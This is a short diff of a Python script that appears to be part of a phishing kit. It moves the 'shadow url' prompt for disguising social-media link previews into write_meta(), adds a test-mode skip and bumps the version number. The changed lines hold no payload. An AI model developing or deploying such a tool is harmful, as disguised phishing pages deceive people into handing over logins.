@@ -109,7 +109,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="2.1.4"
+version="2.1.5"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -712,7 +712,10 @@ def extract(file, extract_path='.', pwd=None):
         
 
 
-def write_meta(url):
+def write_meta():
+    global mode, url
+    if mode == "test":
+        return
     while True:
         if url is None or url == "":
             metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
@@ -1243,11 +1246,7 @@ def main_menu():
             extract("site.zip", site)
             remove("site.zip")
         copy(site, site_dir)
-        if mode == "test":
-            metaurl = ""
-        else:
-            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
-        write_meta(metaurl)
+        write_meta()
         if url is not None:
             redirect_url = url
         else:
